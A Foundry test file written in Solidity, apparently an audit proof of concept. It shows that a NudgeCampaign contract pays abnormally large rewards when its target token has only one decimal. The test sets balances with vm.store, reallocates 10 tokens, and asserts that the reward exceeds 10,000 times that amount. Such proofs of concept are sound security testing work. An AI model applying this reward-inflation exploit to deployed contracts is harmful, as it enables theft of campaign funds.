// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {NudgeCampaign} from "../campaign/NudgeCampaign.sol";
import {NudgeCampaignFactory} from "../campaign/NudgeCampaignFactory.sol";
import {TestERC20} from "../mocks/TestERC20.sol";
import {MockTokenDecimals} from "../mocks/MockTokenDecimals.sol";

contract OverflowTrapTest is Test {
    NudgeCampaign private campaign;
    NudgeCampaignFactory private factory;
    MockTokenDecimals private fakeToken;
    TestERC20 private rewardToken;
    
    address private campaignAdmin = address(1);
    address private swapCaller = address(2);
    address private treasury = address(3);
    uint32 private holdingPeriod = 7 days;
    uint256 private constant REWARD_PPQ = 2e13;
    uint256 private RANDOM_UUID = 123456789;
    uint256 private constant INITIAL_FUNDING = 1_000_000e18; // Ensure sufficient rewards

    function setUp() public {
        // Deploy the fake ERC20 token with only 1 decimal
        fakeToken = new MockTokenDecimals("FakeToken", "FT", 1); 
        rewardToken = new TestERC20("RewardToken", "RT");

        // Deploy the campaign factory
        factory = new NudgeCampaignFactory(treasury, campaignAdmin, campaignAdmin, swapCaller);
        
        // Deploy a campaign using the fake token as the target token
        address campaignAddress = factory.deployCampaign(
            holdingPeriod,
            address(fakeToken),
            address(rewardToken),
            REWARD_PPQ,
            campaignAdmin,
            0,
            treasury,
            RANDOM_UUID
        );
        
        campaign = NudgeCampaign(payable(campaignAddress));

        // Fund the campaign with reward tokens using vm.store()
        vm.store(
            address(rewardToken),
            keccak256(abi.encode(campaignAdmin, uint256(0))), // ERC-20 balance storage slot
            bytes32(INITIAL_FUNDING)
        );

        vm.prank(campaignAdmin);
        rewardToken.transfer(address(campaign), INITIAL_FUNDING);
    }

    function test_OverflowExploit() public {
        uint256 attackAmount = 10; // Attack with only 10 fake tokens

        // Manually set the attacker's balance if mint() is unavailable
        vm.store(
            address(fakeToken),
            keccak256(abi.encode(swapCaller, uint256(0))), // ERC-20 balance storage slot
            bytes32(attackAmount) // Convert uint256 to bytes32
        );

        // Approve and send the manipulated tokens
        vm.prank(swapCaller);
        fakeToken.approve(address(campaign), attackAmount);

        vm.prank(swapCaller);
        campaign.handleReallocation(RANDOM_UUID, swapCaller, address(fakeToken), attackAmount, "");

        // Get the calculated reward amount
        uint256 rewardAmount = campaign.getRewardAmountIncludingFees(attackAmount);

        // Log and verify that the reward amount is abnormally high
        console.log("Exploit successful! Expected high reward, got:", rewardAmount);
        assertGt(rewardAmount, attackAmount * 10000);
    }
}
